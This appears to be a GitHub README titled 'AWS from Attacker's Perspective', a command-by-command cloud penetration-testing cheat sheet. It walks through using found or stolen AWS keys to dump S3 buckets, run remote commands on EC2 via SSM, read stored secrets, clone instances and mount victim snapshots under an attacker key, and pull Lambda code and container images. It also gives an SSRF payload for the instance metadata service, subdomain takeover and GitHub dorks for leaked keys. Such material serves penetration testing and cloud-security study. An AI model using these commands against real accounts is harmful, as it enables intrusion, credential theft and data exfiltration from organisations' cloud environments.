
# AWS from Attacker's Perspective


# Scopes

* S3
* EC2
* SNAPSHOTS
* IAM
* RDS
* LAMBDA
* ECR<br>

We will break AWS Penetesting into two way.

1 - When you are INSIDE the AWS Console.<br>
2 - When you are OUTSIDE the AWS Console.

# When you are INSIDE the AWS Console 

So you found AWS Keys? 

# Configuration

* Configure your tool by providing the key you found.

  `aws configure`

## S3 

* List out all the buckets

  `aws s3 ls`  or `aws s3api list-buckets | python -m json.tool`: On later command we are using json.tool from python to formated it in good json.

* Copy bucket objects to your local folder

  `aws s3 sync s3://<bucketname>/ /foldername`

  FurtherMore: Now you can read what specific bucket is leaking the information, based on the information we can go forward. For ex, we migh find a bucket which contains logs, and after digging the logs we might find sensitive data or other more privileged AWS Keys. 
 
## EC2

* List all the EC2 instances running on account

  `aws ec2 describe-instances`

* Find all only Public IP address on EC2s: You might be so interested in the Public IPs of EC2, because some of them might running an Application, or Admin interface.

  `aws ec2 describe-instances | jq '.Reservations[].Instances[].PublicIpAddress'`

* List the EC2 instance which have SSM Installed:

  `aws ssm describe-instance-information`

### EC2 - SSM

* If SSM is running, try for RCE:-

  `aws ssm send-command --instance-ids "INSTANCE-ID-HERE" --document-name "AWS-RunShellScript" --comment "IP Config" --parameters commands=ifconfig --output text --query "Command.CommandId" --profile stolencreds`

* Check the command details:-

  `aws ssm list-command-invocations --command-id "COMMAND-ID-HERE" --details --query "CommandInvocations[].CommandPlugins[].{Status:Status,Output:Output}" --profile stolencreds`

  Note: In GUI you will face exactly the same parameters as in this command. 

### EC2 - SSM - Read Params

 AWS Systems Manager Parameter Store provides secure, hierarchical storage for configuration data management and secrets management. You can store data such as passwords, database strings, Amazon Machine Image (AMI) IDs, and license codes as parameter values

* List Parameters - Check the Name - This will contain the Name of the parameter or file name.

  `aws ssm describe-parameters `

* Find out the value reside in filename:-

  `aws ssm get-parameters --name <NameYouFindAbove>`


### EC2 - Instance-Connect  

* You can check if Instance Connect is enabled on EC2

  `aws ec2 describe-instances | jq ".[][].Instances | .[] | {InstanceId, KeyName, State}"` This will revealed all the instance IDs -

 * Check if instance connect is available:

   `aws ec2-instance-connect send-ssh-public-key --region us-east-1 --instance-id INSTANCE_WE_GOT_PREVIOUSLY --availability-zone zone --instance-os-user ubuntu --ssh-public-key file://shortkey.pub`



### EC2 - AMI
  
 For this exploit, we need to find out the instance that is running EC2 for their main website. We can check by describing the ec2 and what groups are applied on it, public address with port open 80, 443 for HTTP/S ports
 
* Describe EC2 images

  `aws ec2 describe-images --region specific-region`

  So you identified that ec2? 

* Create AMI for that ec2, 

  `aws ec2 create-image --instance-id ID --name "EXPLOIT" --description "Export AMI" --region specific-region`

* Now add your public key to the EC2

  `aws ec2 import-key-pair --key-name "EXPLOIT" --public-key-material fileb:///publickeyfile`

* Get your newly created AMI details:-

  `aws ec2 describe-images --filters "Name=name,Values=EXPLOIT"`

  Run the AMI above with the same security group, subnet if there is no security group mention, you can skip those. But its important to run with those options if available, the reason is, those contains the firewall rules, which might needed to our instance to communicate with.
  
* Run the instance with name Exploit
  
  `aws ec2 run-instances --image-id {} --security-group-ids "" --subnet-id {} --count 1 --instance-type t2.micro --key-name EXPLOIT`


### EC2 - Security Groups

* List all the security Groups

  `aws ec2 describe-security-groups`

* List all the groups which allowed Public Access.

  `aws ec2 describe-security-groups --filters Name=ip-permission.cidr,Values='0.0.0.0/0' --query "SecurityGroups[*].[GroupName]" --output text`


## SNAPSHOTS

 We can create backups by creating Snapshots in AWS for any specific region. It is a copy of your volume. You can use the snapshots by creating a volumen, based on the permission. 

  Permissions can be: 

  **Public**:   Anyone can create a volume on the snapshots <br>
  **Private**:    Only the owner can create the volume on the snapshots.

* Find the Account ID

  `aws sts get-caller-identity` 

* Find the list of snapshots which owned by our user, `--owner-ids` will filter results to owned by only our targeted user.  

  `aws ec2 describe-snapshots --owner-ids {user-id}`

* To check if your account is having permission, Create volume with any of the snapshot ID listed above:

  `aws ec2 create-volume â€“snapshot-id snapshot_id --availability-zone zone`

* Attach Volume with the instance id that you control in compromised AWS : One thing to note here is, the volume and instance ID must be in same availability zone. 

  `aws ec2 attach-volume --volume-id above-volume-id --instance-id instance-id --device /dev/sdf` 

* Now you have attached volume to the instance as /dev/sdf. Login to the instance. 

##### Now you need to formatted the volume, so that you can access it like a normal file system. You will need to follow these steps described.

* check the devices 

  `lsblk` -- Note: sdf get converted into xvdf, basically 's' converts to 'xv'.

* Check what type of FS on the device `/dev/xvdf`

  `sudo file -s /dev/xvdf1`

* Now we can't mount the new FS on the root FS '/' So we will create a new directory 

  `sudo mkdir /mnt/ec2hack'`

* Now we will mount the volume to the specified directory with correct FS type (that you found from this command `sudo file -s /dev/xvdf1`)

  `sudo mount /dev/xvdf1 /mnt/ec2hack -t xfs -o nouuid` -- nouuid flag is used for mostly xfs file systems.`


  Note: For this exploit all the above commands are checked and working. You might find a difficulty on this attack, possibility is that there is something wrong with filesystem.

##### References
  
  https://confluence.atlassian.com/hipchatkb/how-to-access-to-the-files-inside-of-an-elastic-block-store-volume-827111576.html<br>
  https://serverfault.com/questions/948408/mount-wrong-fs-type-bad-option-bad-superblock-on-dev-xvdf1-missing-codepage

  

## IAM - Hunting Shadow Admin 
  
  The main objective for enumerating IAM is to escalate our privileges by finding a vulnerable permissions. 

  Enumerating is the Key.

  Assuming you have an account which can enumerate IAM.

* List Users:

  `aws iam list-users`

* List User attached Policies:

  `aws iam list-attached-user-policies --user-name {} `

* Get Policy Actions for the speified policy arns that you identified from above.

  `aws  iam get-policy-version --policy-arn provide_policy_arn --version-id $(aws  iam get-policy --policy-arn provide_policy_arn --query 'Policy.DefaultVersionId' --output text)`

* List IAM User inline Policies: Policies which have granular permissions: This will give the Inline Policy Name that is attached to the user.

  `aws  iam list-user-policies --user-name {}`

* We can get the permissions inside the policy.

  `aws  iam get-user-policy --policy-name policy_name_from_above_command --user-name {} | python -m json.tool`

  **Note**: Here we will just identify the policies and their actions. Our main target is to find the vulnerable action inside the policy which can be used to escalate privileges inside AWS Account.

  Vulnerable Actions like:-

  iam:CreatUser<br>
  iam:CreateLoginProfile<br>
  iam:UpdateProfile<br>
  iam:AddUserToGroup<br>

  There are a lot of actions that are used to escalate the privileges. The tedious task is to identify one of them. You can use any tool that helps you to enumerate all these and give a good html result.

  One of the great tool for all this and *MORE* :-

  https://github.com/nccgroup/ScoutSuite

  It enumerates all the data not only IAM but also other like EC2, S3, etc and give you in a beautiful HTML report.


## RDS 

* Check rds available inside AWS

  `aws rds describe-db-instances`

* We can check for Default passwords on the rds. Highly possibility is default creds can be working.


## LAMBDA

* Check the list of functions inside lambda

  `aws lambda list-functions`

* Get the URL for the specific function name we just retrived from above Command.

  `aws lambda get-function --function-name name_we_retrieved_from_above --query 'Code.Location'`

* Download the function:-

  `wget -O myfunction.zip URL_from_above_step`

  So we downloaded the functions, now, its time to analyze the code, sometimes there might be a code vulnerable to Command injection because companies don't care about securities in such cases. Check for secrets also.   
  
## ECR 

* Check the list of Repositories

  `aws ecr describe-repositories | python -m json.tool`
  
* Now, authorise your docker client (docker must be install)

  `aws ecr get-login-password --region us-east-2 | docker login --username AWS --password-stdin <accountID>.dkr.ecr.<region>.amazonaws.com`
  
* Now you can pull the images inside docker and run it as Container.

  `docker pull repositoryUri` repositoryUri: You will find from 1st Command. 
  
* Check the images
  
  `docker images`
 
* Run that image as Container and Enjoy the File System.
  
  `docker run -it <image name> /bin/bash`


# When we are OUTSIDE the AWS Console

## Application Running on EC2?

* Try to look into SSRF vulnerabilities

  https://<vulnerabledomain>/vulnerable.php?url=http://169.254.169.254/latest/meta-data/

* Try port scanning: Possibility is, they might open any internal port which is running Admin Console or anything.

  `nmap -Pn -p- ip`

## S3 Bucket found which have public listings?

* Download all the data: Check if there is any Configuration or any other sensitive file.

  `aws s3 sync s3://<bucketname> /fodler/`

* Check if Upload permission is granted

  `touch 'test.txt'`<br>
  `aws s3 mv test.txt s3://<bucketname>/` 

## Found a subdomain pointing to S3 bucket?

* Create a bucket inside your AWS account with the same name that is found inside CNAME.

# Github Dork

  The possible Github dork for finding AWS Keys:

  * AWSAccessKey
  * AWSAccessKeyid+AWSAccessKey

# Future Work

Will update this repo with more exploitable AWS Services like EKS and more.

# Feedbacks

Please feel free to provide the improvements it would be so helpful. Also if you like this repo let me know on twitter

# Contact

[agrawalsmart7](https://twitter.com/agrawalsmart7)


# Tools

https://github.com/nccgroup/ScoutSuite<br>
https://github.com/andresriancho/enumerate-iam<br>
https://github.com/RhinoSecurityLabs/Security-Research/blob/master/tools/aws-pentest-tools/iam_user_enum/iam_user_enum.py<br>
https://github.com/RhinoSecurityLabs/pacu<br>


# Thanks/References

https://blog.appsecco.com/getting-shell-and-data-access-in-aws-by-chaining-vulnerabilities-7630fa57c7ed<br>
https://medium.com/@gvsakhil143/rds-mysql-instance-of-aws-got-hacked-and-this-is-what-i-did-b72b80c71429<br>
https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/<br>
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest.md#admin-equivalent-permission<br>
https://medium.com/bugbountywriteup/aws-iam-explained-for-red-and-blue-teams-2dda8b20fbf7<br>
https://medium.com/bugbountywriteup/exploiting-fine-grained-aws-iam-permissions-for-total-cloud-compromise-a-real-world-example-part-5a2f3de4be08<br>
